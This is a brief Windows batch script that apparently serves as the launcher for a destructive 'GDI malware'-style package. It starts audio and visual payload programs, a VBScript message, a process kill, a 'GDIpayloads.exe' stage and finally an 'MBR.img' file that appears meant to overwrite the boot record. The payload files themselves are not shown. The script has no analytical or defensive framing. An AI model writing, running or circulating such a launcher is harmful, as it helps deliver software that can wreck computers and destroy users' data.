start ByteBeats.exe
start animationcube.py
start Duriumform.exe
start msg.vbs
timeout /t 40
taskkill /f /im ByteBeats.exe
start SecondaryByteBeats.exe
start GDIpayloads.exe
timeout /t 120
start MBR.img